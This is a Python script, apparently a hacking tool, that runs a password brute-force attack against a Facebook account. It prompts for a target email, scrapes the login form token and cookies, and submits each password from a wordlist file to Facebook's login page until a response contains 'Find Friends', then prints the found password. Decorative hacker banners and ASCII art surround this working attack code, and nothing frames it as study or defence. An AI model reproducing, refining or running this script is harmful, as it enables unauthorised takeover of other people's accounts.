import requests
import threading
# import urllib.request
# import os
from bs4 import BeautifulSoup
import sys
try:
	if sys.version_info[0] < 3:
		raise "REQUIRED PYTHON 3.x"
except Exception as ex:
	print(''' --[WEbsite]----*-----https://www.yehia1hacker.com-----*--------''')
	sys.exit()
post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
payload={}
cookie={}
def create_form():
	form=dict()
	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	data=requests.get(post_url,headers=headers)
	# print('Form Creating : ',data.url)
	# print('Return Status : ',data.status_code)
	#for i in data.headers:
	#	print(i,' : ',data.headers[i])
	for i in data.cookies:
		cookie[i.name]=i.value
	data=BeautifulSoup(data.text,'html.parser').form
	if data.input['name']=='lsd':
		form['lsd']=data.input['value']
	return (form,cookie)

def function(email,passw,i):
	global payload,cookie
	if i%10==1:
		payload,cookie=create_form()
		payload['email']=email
	payload['pass']=passw
	# print(payload)
	# print(cookie)
	# print('lsd : ',payload['lsd'])
	# print(cookie)
	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
	if 'Find Friends' in r.text:
		print('password is ',passw)
		#open('d.html','w').write(r.text)
		return True
	return False

#payload=create_form()

print             ('_\033[1;34;47m**********YEhia---_HacKer*********\033[1;37;40m")_')

print('``````YEHIA````````````::+.``````````````````````WOLF````````````````````.+/:```````````HACKER``````')
print('``````````````````````-o`-os:::-````````````````````````````````````-:::so-`o-``````````````````````')
print('``````````````````````s/:-`oo+oos+.``````````````````````````````./soo+oo`-:/s``````````````````````')
print('``````````````````````yo-s+:-/so/oy+-``````````.`..`.``````````-oyo/os/-:+s-oy``````````````````````')
print('``````````````````````s+-      :yo/sy+----:o-//oooo+o//-o:----+ys/oy:      -+y``````````````````````')
print('``````````````````````oo`       .:y:ohyo+++o+oo/s//s/oo+++o+oyho:y/.-      `oo``````````````````````')
print('``````````````````````oy`       ``oo.oy--//::-/:-..--/-:://--yo.oo``:      `yo``````````````````````')
print('``````````````````````+s--ohyo:...:o`.+.      o:````:oo//:-..+.`o:...:ohho--s+``````````````````````')
print('``````````````````````/+:`-yyyyyso/.`.....`/-:+s+..+s+:-/`.....`./osyyyhy-`:+/``````````````````````')
print('````````````````````...o:../-+/+:..``.++so/::o/-+//+-/s::/os++.``..:+/+-/..:o...````````````````````')
print('```````````````````.:+/+/-.````..``./:/ss+oo.::/..../::-oo+ss/:/.``..```..-/+/+:.```````````````````')
print('```````````````````:+++:-:---:+so+-:ss/:/-//-+so/``/+s+-//-/:/ss:-+os+:--::-:+++:```````````````````')
print('```````````````````.++/:-.`.:++/:..:sys/yos//:+yo..oyo-//ssy/sys:..:/++:.`.-:/++.```````````````````')
print('`````````````````.---://--``-::-/++++syys:/--oo/-::-++o--+:syys++++/-::-``--:/:---.`````````````````')
print('`````````````````.--:/+o:-`.:+shho:...-/::.`.shyo..oyhs.`.::/....-ohhs+:.`-:o+/:--.`````````````````')
print('`````````````````.-/++/-.:+syhhhh+:/h+//-.``.sy/s//s/hy.``.-//+h/:+hhhhhs+:.-/++/-.`````````````````')
print('````````````````.:++ooo/.`:oyhhhy-`__________-:--oo--:-.__________-yhhhyo:`./ooo++:.````````````````')
print('```````````````.+/++o/:.```-+yhyoo:   Yehia  ..-.+/.-../  Hacker  ooyhy+.```.:/o++/+.```````````````')
print('`````````````````-/o/-:/-..+shys/-.__________...:---....__________-/syys/.`-/::/o/:`````````````````')
print('````````````````-++//+:-../-/sssoo//:-+/--.```.`.//.`.``..--/+:://oosss/:/..-:+/:++-````````````````')
print('````````````````--:+/.``````.--/yyo:`:/:--```:syyyyyys:``.--:/:`:oyy/:--``````./+:--````````````````')
print('````````````````-+o//:-:/++/:---/-.-.//-..``./+++yy+++/.``..-//...-/--.:/++/:-://o+-````````````````')
print('```````````````:ooo/:+/+ss+-.`-:.``..-/-..``.+osooooso+```..-/-.```.:-`.-+ss+/+:/ooo:```````````````')
print('```````````````:+++///:.-s/:/+o/:-::/::+:--``-ossyyyso-``--:+::/::-:/o+///s-.:///+++:```````````````')
print('``````````````````.:+oo:.o+ssys/:+syo+-:hs+:---/++++/---:+sh--+oys+:/syso+o.:+o+:.``````````````````')
print('```````````````````-//o/.s+/++osoosyho-.ohh/./::....::/./hho.-ohysooso++/+s./o//-```````````````````')
print('``````````````````.o-/o/.-.----.`--::/:+:yh/`:-+:++:+-:`/hy:+:/::--`.----.-./o/-o.``````````````````')
print('```````````````````-`.++::oo++//.`.//-.:ooos`ssyyyyyyss`sooo:.-//.`.//++oo::++.`-```````````````````')
print('``````````````````````:+.::/+os+:.:++-..osoooyyhhyyhhhyossso..-++:.:+so+/::.+:``````````````````````')
print('`````````````````````````.:-:+/:+o//:-:--yo/yyssssssssyh/oy--::://o+//+:--.`````````````````````````')
print('````````````````````````````..``.-/+//::`/s//        :o+/s+`::/++/-.``..````````````````````````````')
print('`````````````````````````````````..:++:-..s::   WOLF  //:s..::++:..`````````````````````````````````')
print('```````````````````````````````````-:+o+:.o-/:        :/-o.:/o+:-```````````````````````````````````')
print('`````````````````````````````````````.-:..:+:+        +/+:..:-.`````````````````````````````````````')
print('```````````````````````````````````````.:.`s-:/syhhhs/:-s`.:.```````````````````````````````````````')
print('````````````````````````````````````````.+`++-.//////.-++`+.````````````````````````````````````````')
print('`````````````````````````````````````````/:.+oooooooo+o+.::`````````````````````````````````````````')
print('``````````````````````````````````````````/:.-/+osso+/-.:/``````````````````````````````````````````')
print('```````````````````````````````````````````-::-......-::-```````````````````````````````````````````')
print('`````````````````````````````````````````````-::::::::-`````````````````````````````````````````````')
print('  \033[1;31;40m            *********YeHia _HAcKer*************              ')

file=open('yehia1hacker.txt','r')
i=0
email=input('Enter Email _ Or Link_Recovery_~YeHia~ : ')
print("")
print("Target Email ID : ",email)
print("")
while file:
	passw=file.readline().strip()
	i+=1
	print("Trying Password " + str(i) +": ",passw)
	if function(email,passw,i):
		break
	# threading.Thread(target=function,args=(email,passw,i)).start()
	# if not i%10:
		# os.system('pause')


